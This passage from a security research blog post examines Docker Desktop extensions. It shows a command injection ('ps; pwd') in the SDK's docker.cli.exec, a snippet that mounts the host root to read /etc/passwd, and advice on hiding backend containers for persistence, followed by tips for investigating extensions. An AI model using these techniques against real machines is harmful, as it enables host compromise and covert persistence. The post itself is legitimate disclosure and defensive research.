&quot;8280:8280&quot;</code></pre>\n\n\n\n<p>Something that really surprised me was that a service VM, even though it&#x2019;s a container, does now show up when you run <code>docker ps</code>.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ docker ps  -a\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</code></pre>\n\n\n\n<p>Instead, you need to run <code>docker extension ls</code> to see extensions, and then infer that containers are running from the <code>VM</code> section in the output table.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ docker extension ls\nID                                 PROVIDER            VERSION             UI                  VM                  HOST\ngrafana/docker-desktop-extension   Grafana Labs        0.0.2               1 tab(Grafana)      Running(2)          -</code></pre>\n\n\n\n<p>It was also not immediately obvious to me how one would know which legitimate sockets an extension was listening on, or, because the <code>docker-compose.yml</code> can have so many other properties, which ports might be open and or volumes are mounted. Not great.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"theextension-api-clientsdk\">the extension-api-client sdk</h2>\n\n\n\n<p>When a new UI component is scaffolded using the <code>docker extension init</code> command, one of the libraries imported is the extension-api-client library.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>import { createDockerDesktopClient } from &apos;@docker/extension-api-client&apos;;</code></pre>\n\n\n\n<p>This is the primary library used to glue the extension to Docker Desktop and an optional backend service. A function called <code>createDockerDesktopClient()</code> is invoked to get a new <code>DockerDesktopClient</code> instance from where <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/dev/api/reference/README/\" target=\"_blank\">various API calls</a> can be made.</p>\n\n\n\n<p>I couldn&#x2019;t find the actual source code online for the library, but rather <a rel=\"noreferrer noopener\" href=\"https://www.npmjs.com/package/@docker/extension-api-client?activeTab=code\" target=\"_blank\">a shim</a> that would throw an error if the <code>.ddClient</code> property was not available on the <code>window</code> object.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>export function createDockerDesktopClient() {\n    const ddClientFromWindowObject = window\n        ?.ddClient;\n    if (!ddClientFromWindowObject) {\n        throw new Error(&apos;This version of @docker/extension-api-client is not supported by your version of Docker Desktop. Please upgrade to the latest version.&apos;);\n    }\n    return ddClientFromWindowObject;\n}</code></pre>\n\n\n\n<p>This is not a problem (as you will see later), and so I just decided to play with the API the <code>DockerDesktopClient</code> object provided for now. A simple way to do that is to just use the code completion VSCode is smart enough to setup for you to learn about it.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-79.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"384\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-79-1024x384.png\" alt=\"\" class=\"wp-image-65477\"></a></figure>\n\n\n\n<p>The API is not very large, but three interesting functions immediately stood out for me:</p>\n\n\n\n<ul>\n<li>ddClient.docker.cli.exec()</li>\n\n\n\n<li>ddClient.extension.host.cli.exec()</li>\n\n\n\n<li>ddClient.extension.vm.cli.exec()</li>\n</ul>\n\n\n\n<p>I&#x2019;ll be honest, the first time I saw these I had no idea what they really meant and I assumed a lot. My gut feel wasn&#x2019;t too far off, and neither is yours if this is the first time you see them.</p>\n\n\n\n<p>I took the boilerplate code and started messing with the function calls used on the created <code>DockerDesktopClient</code> instance to instead of calling the backend service, just invoke these exec() functions and populate the output in the UI (with the hot reloading feature I mentioned earlier configured). Effectively that meant that I only had to fiddle with the already provided <code>fetchAndDisplayResponse</code> function, save my changes, tab back to Docker Desktop and click the &#x201C;Call backend&#x201D; button to see the effect. For example:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>  const fetchAndDisplayResponse = async () =&gt; {\n    const result = await ddClient.docker.cli.exec(&quot;ps&quot;, []);\n    setResponse(JSON.stringify(result));\n  };</code></pre>\n\n\n\n<p>This function would update the extensions&#x2019; UI to show the output of the <code>exec()</code> function I called which supposedly (spoiler: it did) called <code>docker ps</code> under the hood like this:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-80.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"418\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-80-1024x418.png\" alt=\"\" class=\"wp-image-65479\"></a></figure>\n\n\n\n<p>Up until this point, everything behaved pretty much as I expected and matched what I read in the docs.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"hostvm.cli.exec\">(host|vm).cli.exec</h2>\n\n\n\n<p>The <code>ddClient.extension.host</code> and <code>ddClient.extension.vm</code> properties, as the names imply, refer to the service VM (aka: the backend) and the host operating system. Both of them have the <code>cli.exec()</code> function with the same signature, but behave slightly differently.</p>\n\n\n\n<p>Let&#x2019;s start with the service specific exec function, <code>vm.cli.exec</code>. Given the following line of code to run the <code>ls /</code> command:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>const result = await ddClient.extension.vm?.cli.exec(&quot;ls&quot;, [&quot;/&quot;]);</code></pre>\n\n\n\n<p>The resulting output in Docker Desktop would look as follows:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-83.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"246\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-83-1024x246.png\" alt=\"\" class=\"wp-image-65680\"></a></figure>\n\n\n\n<p>That is the output as expected. A (hard to read) list of files and folders inside of the docker container which is also the container where the backend service that the boilerplate <code>docker init</code> generator provided is running. Easy enough.</p>\n\n\n\n<p>To run a command on the host, I simply ran the host variant of the same code as follows:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>const result = await ddClient.extension.host?.cli.exec(&quot;ls&quot;, [&quot;/&quot;]);</code></pre>\n\n\n\n<p>The difference in output though was&#x2026; that there was no output. I reloaded the extension numerous times, double checked for syntax errors and more, but no dice. I had to go deeper!</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"debuggingdockerdesktopextensions\">debugging docker desktop extensions</h2>\n\n\n\n<p>Given that Docker Desktop is an electron application, it&#x2019;s not strange to imagine that you can open the Chrome console/debugger attached to it. The question though is, how?</p>\n\n\n\n<p><code>up, up, down, down, left, right, left, right, p, d, t</code></p>\n\n\n\n<p>That is how. <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/dev/test-debug/#open-chrome-devtools\" target=\"_blank\">I&#x2019;m not even kidding</a>. While a variation of the <a rel=\"noreferrer noopener\" href=\"https://en.wikipedia.org/wiki/Konami_Code\" target=\"_blank\">Konami Code</a> funny the first time, it&#x2019;s incredibly frustrating to deal with given how often the console window closes, forcing you to repeatedly type this sequence; every, freaking, time.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"runninghostbinaries\">running host binaries</h2>\n\n\n\n<p>With the developer console open, I could finally see some debugging output when I tried to run <code>ls</code> on the host.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-84.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"321\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-84-1024x321.png\" alt=\"\" class=\"wp-image-65824\"></a></figure>\n\n\n\n<p>Turns out there were two problems. One, exceptions weren&#x2019;t propagated to the UI which is why I needed the console (meh). Two, apparently my extension tried to run <code>ls</code> relative to the current directory. This wasn&#x2019;t a problem when running <code>ls</code> in the container though. Okay, so let&#x2019;s try running <code>/bin/ls</code> instead then.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>const result = await ddClient.extension.host?.cli.exec(&quot;/bin/ls&quot;, [&quot;/&quot;]);</code></pre>\n\n\n\n<p>The result?</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-86.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"321\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-86-1024x321.png\" alt=\"\" class=\"wp-image-66334\"></a></figure>\n\n\n\n<p>I double checked my own sanity, and confirmed that <code>/bin/ls</code> really is where I thought it would be, but instead, the response when trying to execute it is a sentence specifically saying that the extension binary is not found. Does this mean extensions can&#x2019;t execute arbitrary commands on the host operating system?</p>\n\n\n\n<p>I checked out <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/guides/invoke-host-binaries/\" target=\"_blank\">the documentation</a> once more to see what the intended flow was here, and learnt about the fact that an extension itself needs to also ship any scripts/binaries it wants to run. These binaries/scripts must be declared in the <code>metadata.json</code> file for each supported operating system / architecture and will be copied to the service VM (aka: backend) when building the extension. When installing the extension these will be copied to the host operating system. That means, if I wanted to have a script available to run from the frontend UI, I needed to declare a new block in my <code>metadata.json</code> file like this (next to the <code>ui</code> and <code>vm</code> keys) with the path where it will be in the service container:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>  &quot;host&quot;: {\n    &quot;binaries&quot;: [\n      {\n        &quot;darwin&quot;: [{ &quot;path&quot;: &quot;/poo.sh&quot; }]\n      }\n    ]\n  }</code></pre>\n\n\n\n<p>The <code>Dockerfile</code> for the extension would simply copy the executable script from a local path into the container on build with this line:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>COPY poo.sh /poo.sh</code></pre>\n\n\n\n<p>After building the extension and finally installing it with the <code>docker extension install</code> command, a few lines showing that binaries are installed on the host (well really just copied out of the container into an extension specific directory on the host which was <code>~/Library/Containers/com.docker.docker/Data/extensions/extension-name/host/</code> for me) should show up:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>...\n\nInstalling Desktop extension binary &quot;poo.sh&quot; on host...\nDesktop extension binary &quot;poo.sh&quot; installed\n\n...</code></pre>\n\n\n\n<p>With that all set up, running the <code>host.cli.exec</code> call with my new script should now look like this.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>const result = await ddClient.extension.host?.cli.exec(&quot;poo.sh&quot;, []);</code></pre>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-87.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"321\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-87-1024x321.png\" alt=\"\" class=\"wp-image-66346\"></a></figure>\n\n\n\n<p>To double check that the file on my host operating system really was the one the extension UI would run, I updated it from the host to print the current working directory as well, and reran it via the Docker Desktop Extension UI.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-88.png\"><img loading=\"lazy\" decoding=\"async\" width=\"840\" height=\"580\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-88.png\" alt=\"\" class=\"wp-image-66347\"></a></figure>\n\n\n\n<p>As expected, the output updated to include the result of the <code>pwd</code> command that I had added.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-89.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"321\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-89-1024x321.png\" alt=\"\" class=\"wp-image-66348\"></a></figure>\n\n\n\n<p>Great. So it seems like there is something preventing one from running arbitrary operating system commands using just the SDK. The question though is, what and how does that work?</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"arbitrarycommandexecutionindocker.cli.exec\">arbitrary command execution in docker.cli.exec()</h2>\n\n\n\n<p>At this point I figured I knew enough about the SDK and how it was intended to be used that I started playing around a bit more. To recap, the host and VM versions of <code>cli.exec</code> had the same function signatures, but behaved differently in that the VM version did not sanitise paths whereas the host version did.</p>\n\n\n\n<p>I tried a few things to try and get <code>host.cli.exec</code> to execute a command without it being in the <code>metadata.json</code> file first, but none of my cheap shots were successful. This included messing with some <code>ENV</code> variables you can set in the <code>exec</code> call via an optional <code>ExecOptions</code> argument. In most of the cases the console session attached to the extension UI told me the binary can&#x2019;t be found, or threw some exception.</p>\n\n\n\n<p>For a moment I turned back to the <code>ddClient.docker.cli.exec</code> call though and notices the <code>ps</code> argument passed to it; just like you&#x2019;d use on the command line. I tried a classic command injection in the first argument there using something like <code>ps; pwd</code>. That meant my code looked something like this:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>const result = await ddClient.docker.cli.exec(&quot;ps; pwd&quot;, []);</code></pre>\n\n\n\n<p>The result?</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-91.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"261\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-91-1024x261.png\" alt=\"\" class=\"wp-image-66350\"></a></figure>\n\n\n\n<p>Arbitrary command execution using the SDK via the docker.cli.exec function!</p>\n\n\n\n<p>At this stage I really wasn&#x2019;t sure what this meant, if anything at all. Even though the host/VM exec versions clearly behave differently and it seemed like some effort was made to prevent extensions from running arbitrary operating system commands using the SDK, all of that was bypassed via the <code>docker.cli.exec</code> implementation. I was also mostly confused about why this injection worked in the first place, so, I started hunting for the SDK source code to learn more.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"gettingtheextension-api-clientsdksourcecode\">getting the extension-api-client sdk source code</h2>\n\n\n\n<p>As I&#x2019;ve mentioned previously, the <code>@docker/extension-api-client</code> source code wasn&#x2019;t particularly interesting as it only contained a shim to check if the <code>ddClient</code> object was available on the <code>window</code> object. With Docker Desktop being an Electron application, one can easily supply extra JavaScript libraries as part of the application&#x2019;s bundle, and it seemed like Docker decided that the source code for the SDK is not something you can get on Github (at least, not where I could find it). Not to worry though, Electron applications typically have their source code bundled into an <a rel=\"noreferrer noopener\" href=\"https://www.electronjs.org/docs/latest/tutorial/asar-archives\" target=\"_blank\">ASAR archive</a>. There is even a handy <a rel=\"noreferrer noopener\" href=\"https://github.com/electron/asar\" target=\"_blank\">asar utility</a> to work with these archives provided by Electron which includes the ability to extract them.</p>\n\n\n\n<p>On macOS, the Docker Desktop ASAR archive could be found in <code>/Applications/Docker.app/Contents/MacOS/Docker Desktop.app/Contents/Resources</code>. I copied the <code>app.asar</code> file together with the <code>app.asar.unpacked</code> folder to a temporary directory and extracted it there using the <code>asar extract</code> command. This left me with the following files and folder structure:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>? ll\nPermissions Size User    Date Modified Name\ndrwxr-xr-x     - leonjza 23 May 22:47  node_modules\n.rw-r--r--   945 leonjza 23 May 22:47  package.json\ndrwxr-xr-x     - leonjza 23 May 22:30  src_transpiled\ndrwxr-xr-x     - leonjza 23 May 22:30  web</code></pre>\n\n\n\n<p>I did a quick check to see if what I was looking for was in any of these files with a quick grep. </p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-90.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"233\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-90-1024x233.png\" alt=\"\" class=\"wp-image-66349\"></a></figure>\n\n\n\n<p>Yeah, this was it for sure. More specifically, the search revealed a directory called <code>extension-api-client-ipc</code> which was named closely to the one I was after. That was where I started to check for hints on how this all worked.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"analysingthesdkandfindingthebug\">analysing the sdk and finding the &#x201C;bug&#x201D;</h2>\n\n\n\n<p>I am not going to bore you with all of the details of the SDK, but I&#x2019;ll highlight a few key things to learn from the codebase. Bonus points for the fact that it looked like the TypeScript source code was available, unminified. That made for very easy reading and analysis! Heck, for the most part VSCode intellisense even worked!</p>\n\n\n\n<p>The SDK&#x2019;s <code>src/createExtensionNode.ts</code> file had a function called <code>createExtensionNode</code> which returned a object that matched the SDK API. Notice the <code>TODO</code> there. I think someone knew what was coming here. :D </p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-92.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"972\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-92-1024x972.png\" alt=\"\" class=\"wp-image-66351\"></a></figure>\n\n\n\n<p>The SDK made heavy use of the Electron <a rel=\"noreferrer noopener\" href=\"https://www.electronjs.org/docs/latest/api/ipc-renderer\" target=\"_blank\">ipcRenderer</a>, to communicate between the extension and the main Electron thread asynchronously. For example, the <code>host.cli.exec</code> function would call something like <code>ipcRenderer.postMessage(&apos;extension-spawn-cmd&apos;, ...);</code> (a reduced example) to effectively invoke whatever is registered to listen for <code>extension-spawn-cmd</code> to do some work.</p>\n\n\n\n<p>In another location (not specifically the SDK now), in <code>src_transpiled/extensions/registerDashboardPageIpcHandlers.js</code>, many Electron IPC handlers were registered  such as <code>extension-spawn-cmd</code>. These were implemented for example as <code>electron_1.ipcMain.on(&apos;extension-spawn-cmd&apos;, ...)</code>. From here we could finally see the real functions invoked to execute commands coming in from an SDK function invoked by an extension.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-94.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"146\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-94-1024x146.png\" alt=\"\" class=\"wp-image-66353\"></a></figure>\n\n\n\n<p>The <code>spawnHostCmd</code> was probably the most important function to find.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-95.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"327\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-95-1024x327.png\" alt=\"\" class=\"wp-image-66354\"></a></figure>\n\n\n\n<p>This function does a path check on the <code>cmd</code> argument received, and if it does not exist, return the error we saw earlier when trying to run binaries with <code>host.cli.exec</code>. If everything checks out, execution passes to <code>spawnCommand</code> that simply does a <a rel=\"noreferrer noopener\" href=\"https://nodejs.org/api/child_process.html#child_processspawncommand-args-options\" target=\"_blank\">child_process.spawn</a> while gluing all of the relevant event listeners and cleanup routines together. In summary, <code>spawnCommand</code> takes a raw command and runs it.</p>\n\n\n\n<p>In the same file though, there is a function called <code>spawnDockerCmd</code>.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-96.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"160\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-96-1024x160.png\" alt=\"\" class=\"wp-image-66355\"></a></figure>\n\n\n\n<p>Notice how this function is simply a wrapper to <code>spawnCommand</code> and not <code>spawnHostCommand</code>? I double checked the flow from the <code>docker.cli.exec</code> definition for the SDK to here and it checked out. This is why a command injection in <code>docker.cli.exec</code> works; it&#x2019;s literally just a wrapper to <code>child_process.spawn</code>. It makes sense too; the <code>docker</code> binary is not shipped with the extension but rather is available on the host so the path check in <code>spawnHostCommand</code> would cause it to fail.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"commandexecutionrisksincontext\">command execution risks in context</h2>\n\n\n\n<p>To be upfront, I am not sure about the risks of the command injection I found, especially in the context of what is possible with a Docker Desktop Extension by default. It could totally be a non-issue given how many different ways you could achieve the same thing with extensions.</p>\n\n\n\n<p>The documentation as well as the <code>docker extension install</code> command warns you multiple times about the risks involved. However, most of the confusion for me in terms of risk is driven by the fact that some effort is made to limit what an extension can execute on the host running Docker Desktop from the UI. If you consider that backend service VM&#x2019;s can mount any directory (via the <code>docker-compose.yml</code> file) and have any code they would want to run shipped as part of a container (including scripts that contain arbitrary commands), maybe the command injection really isn&#x2019;t that interesting (or not even a bug to begin with)?</p>\n\n\n\n<p>There is also the fact that you can run any arbitrary docker containers using the UI SDK which would effectively boil down to the same risk. For example:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>const result = await ddClient.docker.cli\n  .exec(&quot;run&quot;, [&quot;--rm&quot;, &quot;-v&quot;, &quot;/:/host_root&quot;, &quot;alpine&quot;, &quot;cat&quot;, &quot;/etc/passwd&quot;]);</code></pre>\n\n\n\n<p>When considering extension reviews (or otherwise investigating what an extension does which I touch on later in this post), it&#x2019;s nice to have an overview of what an extension may be up to given the <code>metadata.json</code> file and SDK API usage (assuming no bugs) which is what I think Docker went for here. As extensions don&#x2019;t have to be open source and can easily minify/obfuscate their source code, spotting malicious use of the <code>docker.cli.exec</code> function might be hard.</p>\n\n\n\n<p>Then there is the other problem. It&#x2019;s not immediately obvious to me how a user is supposed to verify (or get an overview of) how a particular extension works other than the description on the Marketplace to determine if they trust it. The only option really is to manually investigate it (which I dive into a bit later).</p>\n\n\n\n<p>I reported this issue to the docker security team, and their response in short was that this is a non-issue, though they will try and fix the injection in a later release.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"dockerextensionsforpersistence\">docker extensions for persistence</h2>\n\n\n\n<p>Because backend service VM&#x2019;s are long running containers, and the fact that they don&#x2019;t show up when running <code>docker ps</code>, I figured it would be interesting to consider how extensions could be used for persistence. More so because they effectively run with the same privileges as the user running Docker Desktop.</p>\n\n\n\n<p>Because the UI tears down completely when navigating away from it in the Docker Desktop application, I figured it wasn&#x2019;t that interesting a place to have some code running that could be useful later. Especially if you wanted to make it not so obvious. Backend service VM&#x2019;s however are significantly more interesting.</p>\n\n\n\n<p>But, wouldn&#x2019;t it be cool if we could have a service VM running without it being visible in Docker Desktop? We&#x2019;ll, turns out if you just omit the value defined in the <code>metadata.json</code> file for the <code>ui.dashboard-tab.title</code> key, or completely omit the parent <code>ui</code> key, the extension will run the service VM without a tab showing up in Docker Desktop Extensions list. It will however show up in the extensions&#x2019; &#x201C;Manage&#x201D; tab.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-97.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"406\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-97-1024x406.png\" alt=\"\" class=\"wp-image-66364\"></a></figure>\n\n\n\n<p>In contrast, when an extension with a UI is installed, it typically shows up in the Extensions list making it a little more obvious that an extension is running.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-99.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"458\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-99-1024x458.png\" alt=\"\" class=\"wp-image-66366\"></a></figure>\n\n\n\n<p>The next thing you may notice is how little information is shown in the manage tab of the Docker Desktop UI for my test extension. Part of the extensions requirements for service VM&#x2019;s is that you need to declare various labels in your Dockerfile for the service VM. Only the <code>com.docker.desktop.extension.api.version</code> label was required when I built it locally, so leaving everything else blank has your extension tell a little less about itself to Docker Desktop. This may be a good or bad thing, depending on how you plan on hiding in plain sight ;). Keep in mind though that this will fail with the <code>docker extension validate</code> if you plan on publishing your extension on the market place.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-100.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"74\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-100-1024x74.png\" alt=\"\" class=\"wp-image-66367\"></a></figure>\n\n\n\n<p>The <code>docker-compose.yml</code> file is probably the most important part to have your service VM able to do anything interesting beyond maybe just being a tunnel into the target network where a malicious extension is installed (which is already powerful). Access to the host operating systems filesystem can be achieved with a mount point defined that makes the compose file look something like this:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>services:\n  docker-test-extension:\n    image: ${DESKTOP_PLUGIN_IMAGE}\n    volumes:\n    - /:/host_root</code></pre>\n\n\n\n<p>This will have a Docker Desktop Extension service VM have access to the host operating systems file system. Inside of the service VM there could be code running that makes a connection out to a command and control server, ready to execute commands, setup proxies to an internal network and or read files of the host (to name a few); all without you really knowing that this is obviously happening. Lastly, given that Docker Desktop depends on a backend Virtual Machine to run, I&#x2019;m not sure of many endpoint security products having the ability to peek inside of VM&#x2019;s to spot something nefarious happening there.</p>\n\n\n\n<p>As for a PoC, I&#x2019;ll leave this as an exercise for the reader to explore a little further ;)</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"desktopextensionsandtheextensionmarketplace\">docker desktop extensions and the extension market place</h2>\n\n\n\n<p>The next part you might be wondering is how the Docker Desktop Extension marketplace helps with any of this. Docker has a guideline for how extension marketplace submissions work, along with the verification workflow <a rel=\"noreferrer noopener\" href=\"https://www.docker.com/products/extensions/submissions/\" target=\"_blank\">here</a>. In summary, the extension needs to meet some requirements and the review process is manual. In exchange, your extension gets a cool &#x201C;Reviewed&#x201D; label.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-102.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"197\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-102-1024x197.png\" alt=\"\" class=\"wp-image-66376\"></a></figure>\n\n\n\n<p>Looking at the publishing documentation <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/extensions/publish/\" target=\"_blank\">here</a> though, you can also find a link to &#x201C;Self-publish&#x201D; your extension which appears to be driven by a Github Action workflow that automates extension publishing to the marketplace without human intervention. For example, <a rel=\"noreferrer noopener\" href=\"https://github.com/docker/extensions-submissions/issues/70\" target=\"_blank\">this submission issue</a> shows that in action. Doing it this way has your extension show up in the market place with a &#x201C;Not reviewed label&#x201D;.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-103.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"197\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-103-1024x197.png\" alt=\"\" class=\"wp-image-66377\"></a></figure>\n\n\n\n<p>I did not try and publish a malicious extension myself, though I imagine the automated submission process of a seemingly benign extension would have at least some shelf-life. More so abusing the command injection I found.</p>\n\n\n\n<p>That said, your extension does not have to be in the Marketplace to be installable. You can simply publish your extension container to a registry and install it with <code>docker extension install</code>. For example:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-115.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"274\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-115-1024x274.png\" alt=\"\" class=\"wp-image-66397\"></a></figure>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"investigatingdockerdesktopextensions\">investigating docker desktop extensions</h2>\n\n\n\n<p>So I just spoke a lot about all of the bad things an extension could potentially get up to. The more important question though should be: &#x201C;How can I investigate extensions myself?&#x201D;.</p>\n\n\n\n<p>You are generally interested in two things. The frontend UI and the backend service(s). Diving into each, below is a handy guide with some tips to dig under the covers and see whats really happening depending on if you have installed the extension already, or not.</p>\n\n\n\n<p>The basic components you should be interested in is the <code>docker-compose.yml</code>, the <code>metadata.json</code> file, the service containers themselves and finally the UI sources.</p>\n\n\n\n<p>The <code>metadata.json</code> file could give you an idea of where:</p>\n\n\n\n<ul>\n<li>The <code>docker-compose.yml</code> lives together with any unix sockets/named pipes it will expect to connect the UI.</li>\n\n\n\n<li>The UI source code lives.</li>\n\n\n\n<li>Any host binaries are that will be copied to the OS.</li>\n</ul>\n\n\n\n<p>The <code>docker-compose.yml</code> file should be checked as it could enable services to:</p>\n\n\n\n<ul>\n<li>Mount host directories into the container.</li>\n\n\n\n<li>Grant the container extra privileges.</li>\n\n\n\n<li>Mount in the docker socket to do all of the above.</li>\n\n\n\n<li>Open arbitrary ports.</li>\n</ul>\n\n\n\n<p>The UI source directory could be checked to see if there is:</p>\n\n\n\n<ul>\n<li>Suspicious usage of the Docker Desktop Extensions SDK. i.e. Is the UI spawning arbitrary containers?</li>\n\n\n\n<li>Host binary invocation and what that is? Maybe even command injections ;)</li>\n</ul>\n\n\n\n<p>One issue you may run into with the UI components is that extension authors could easily minify and or otherwise obfuscate the JavaScript sources, making it difficult to analyse. In fact, of the few extensions I looked at nearly all of them at least minified their JavaScript sources. Annoying.</p>\n\n\n\n<p>Finally, the service VM containers themselves are obviously interesting. These containers could really be running anything, so I would suggest investigating them separately, inspecting their layers with tools such as <a rel=\"noreferrer noopener\" href=\"https://github.com/wagoodman/dive\" target=\"_blank\">dive</a> and getting an idea of what is run inside.</p>\n\n\n\n<p>Regardless, now that you know which components of extensions are interesting, lets look at how you can 